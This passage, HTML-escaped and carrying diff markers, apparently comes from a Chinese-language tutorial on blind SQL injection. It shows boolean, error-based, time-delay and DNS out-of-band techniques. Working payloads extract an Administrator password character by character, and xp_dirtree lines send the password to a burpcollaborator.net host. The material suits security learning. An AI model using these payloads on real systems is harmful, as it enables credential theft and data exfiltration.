+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;…&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xyz&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;观察返回的结果，如果两个例子返回的不同，就可以根据返回结果来判断查询是否是有效的，我们能做的就很多了。你可以通过发送一系列输入，&lt;strong&gt;逐字符测试密码&lt;/strong&gt;，最终确定某项数据。&lt;/p&gt;
+&lt;p&gt;操作步骤如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;首先发送以下输入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xyz&amp;#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &amp;#39;Administrator&amp;#39;), 1, 1) &amp;gt; &amp;#39;m
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;若返回成功，说明注入的条件为真，即密码的第一个字符大于 &lt;code&gt;m&lt;/code&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;接着发送以下输入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xyz&amp;#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &amp;#39;Administrator&amp;#39;), 1, 1) &amp;gt; &amp;#39;t
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;若未返回成功，说明注入的条件为假，即密码的第一个字符不大于 &lt;code&gt;t&lt;/code&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;最终发送以下输入，若返回成功，则可确认密码的第一个字符为 &lt;code&gt;s&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xyz&amp;#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &amp;#39;Administrator&amp;#39;), 1, 1) = &amp;#39;s
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;重复上述过程，即可系统性地推断出 &lt;code&gt;Administrator&lt;/code&gt; 用户的完整密码。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;SUBSTRING(查询的字符串，起始位置，截取几个字符)，在有些数据库里，又叫做 SUBSTR&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;条件&#34;&gt;条件
+&lt;/h4&gt;&lt;p&gt;报错型 SQL 注入指的是：即便在盲注场景下，你仍可利用数据库返回的&lt;strong&gt;错误信息&lt;/strong&gt;，直接提取或推断数据库中的敏感数据。与布尔盲注的差别主要是,报错盲注会返回具体的&lt;strong&gt;报错信息&lt;/strong&gt;可供利用，或者只检查语句本身是否合法，而不检查语句是否为真。&lt;/p&gt;
+&lt;p&gt;要理解这种技术的工作方式，假设依次发送两个请求，请求中包含的&lt;code&gt;TrackingId&lt;/code&gt; Cookie值分别为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xyz&amp;#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &amp;#39;a&amp;#39; END)=&amp;#39;a
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;xyz&amp;#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &amp;#39;a&amp;#39; END)=&amp;#39;a
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这些输入利用&lt;code&gt;CASE&lt;/code&gt;关键字测试条件，并根据条件是否成立返回不同的表达式，具体逻辑如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;第一个输入中，&lt;code&gt;CASE&lt;/code&gt;表达式的结果为&lt;code&gt;&#39;a&#39;&lt;/code&gt;，不会触发任何数据库错误；&lt;/li&gt;
+&lt;li&gt;第二个输入中，&lt;code&gt;CASE&lt;/code&gt;表达式的结果为&lt;code&gt;1/0&lt;/code&gt;（零除运算），会触发&lt;strong&gt;除零错误&lt;/strong&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果该错误会导致应用的HTTP响应产生可识别的差异（如返回500错误页、弹出提示信息），你就可以借此判断注入的条件是否成立。&lt;/p&gt;
+&lt;p&gt;借助这种技术，你可以通过&lt;strong&gt;逐字符测试&lt;/strong&gt;的方式提取数据库中的数据，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;xyz&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND (SELECT CASE WHEN (Username = &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND SUBSTRING(Password, 1, 1) &amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) THEN 1/0 ELSE &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; END FROM Users)=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;&#34;&gt;
+&lt;/h3&gt;&lt;h3 id=&#34;&#34;&gt;
+&lt;/h3&gt;&lt;p&gt;典型错误：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;类型转换错误&lt;/strong&gt;：例如在数值列中注入字符串，仅当条件为真时执行该转换（如&lt;code&gt;AND (IF(1=1, CAST(&#39;a&#39; AS INT), 0))&lt;/code&gt;）；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;子查询语法错误&lt;/strong&gt;：构造仅在条件为真时返回多行的子查询，触发 “单行子查询返回多行” 错误；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;函数调用错误&lt;/strong&gt;：调用数据库内置函数时传入非法参数，仅在条件为真时触发函数执行错误。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;报错&#34;&gt;报错
+&lt;/h4&gt;&lt;p&gt;由于数据库&lt;strong&gt;配置不当&lt;/strong&gt;，有时会输出错误信息，在某些情况下，你甚至可以诱导应用生成&lt;strong&gt;包含查询结果数据&lt;/strong&gt;的错误信息。这一手段能将原本的盲注漏洞，转化为可直接查看数据的 “显错注入”，大幅降低攻击难度。&lt;/p&gt;
+&lt;p&gt;你可以使用&lt;code&gt;CAST()&lt;/code&gt;函数实现这一目的，该函数的作用是将一种数据类型转换为另一种。例如，构造包含如下语句的查询：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;CAST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;example_column&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;example_table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通常，你试图读取的目标数据是字符串类型，而将字符串强制转换为不兼容的类型（如整数&lt;code&gt;int&lt;/code&gt;）时，数据库会抛出类似如下的错误：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ERROR: invalid input syntax for type integer: &amp;ldquo;Example data&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;值得注意的是，若目标应用存在字符长度限制，导致你无法通过常规的条件响应方式进行盲注时，这种利用类型转换错误提取数据的方法会尤为有效。&lt;/p&gt;
+&lt;h4 id=&#34;时间&#34;&gt;时间
+&lt;/h4&gt;&lt;p&gt;若应用在SQL查询执行时捕获数据库错误并优雅处理，其响应不会出现任何差异——这意味着前文所述的条件错误注入技术将失效。&lt;/p&gt;
+&lt;p&gt;这种情况下，可通过&lt;strong&gt;根据注入条件的真假触发不同时间延迟&lt;/strong&gt;来利用盲注漏洞。由于应用通常会同步处理SQL查询，延迟SQL执行会导致HTTP响应同步延迟，因此可通过接收响应的耗时判断注入条件的真假。&lt;/p&gt;
+&lt;p&gt;触发时间延迟的技术因数据库类型而异。例如在Microsoft SQL Server中，可通过以下语句测试条件并根据结果触发延迟：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;; IF (1=2) WAITFOR DELAY &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;IF&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WAITFOR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DELAY&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0:0:10&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;第一条输入不触发延迟（条件1=2为假）；&lt;/li&gt;
+&lt;li&gt;第二条输入触发10秒延迟（条件1=1为真）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;借助该技术可逐字符提取数据，示例如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; AND SUBSTRING(Password, 1, 1) &amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) = 1 WAITFOR DELAY &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;SQL查询中触发时间延迟的方式多样，不同数据库适用不同技术，详情可参考SQL注入速查表。&lt;/p&gt;
+&lt;h4 id=&#34;带外&#34;&gt;带外
+&lt;/h4&gt;&lt;p&gt;某些应用可能会以&lt;strong&gt;异步方式&lt;/strong&gt;执行与之前示例相同的SQL查询：应用在原线程中继续处理用户请求，同时&lt;strong&gt;用另一个线程&lt;/strong&gt;执行包含Tracking Cookie的SQL查询。此时查询仍存在SQL注入漏洞，但此前介绍的所有技术都将失效——因为应用的响应不依赖于查询返回的数据、数据库错误，也不依赖于查询的执行时间。&lt;/p&gt;
+&lt;p&gt;这种情况下，通常可以通过&lt;strong&gt;触发向你控制的系统发起带外网络交互&lt;/strong&gt;来利用盲注漏洞。你可以基于注入的条件触发这类交互，从而逐段推断信息；更实用的是，还能直接&lt;strong&gt;通过网络交互泄露数据&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;多种网络协议都可用于此目的，但最有效的通常是DNS（域名系统）——许多生产网络允许&lt;strong&gt;DNS查询自由出站&lt;/strong&gt;，因为这是生产系统正常运行的必要条件。&lt;/p&gt;
+&lt;p&gt;使用带外技术最简单可靠的工具是&lt;strong&gt;Burp Collaborator&lt;/strong&gt;：这是一个提供多种网络服务（包括DNS）自定义实现的服务器，能让你检测发送单个载荷后是否触发了网络交互。Burp Suite专业版内置了客户端，默认已配置好与Burp Collaborator的协作。更多信息可参考Burp Collaborator的文档。&lt;/p&gt;
+&lt;p&gt;触发DNS查询的技术因数据库类型而异。例如，在Microsoft SQL Server中，以下输入可导致数据库对指定域名发起DNS查询：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;; exec master..xp_dirtree &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;efdymgw1o5w9inae8mg4dfrgim9ay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;burpcollaborator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;exec master..xp_dirtree&lt;/code&gt;调用系统存储过程，传入的参数是一个&lt;strong&gt;网络共享 UNC 路径&lt;/strong&gt;（&lt;code&gt;//域名/a&lt;/code&gt;）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这会让数据库查询以下域名：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;子域名外带：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;; exec master..xp_dirtree &amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; + (SELECT password FROM users WHERE username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;administrator&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;) + &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;efdymgw1o5w9inae8mg4dfrgim9ay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;burpcollaborator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;或者多语句结合
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;declare&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;master..xp_dirtree &amp;#34;//&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
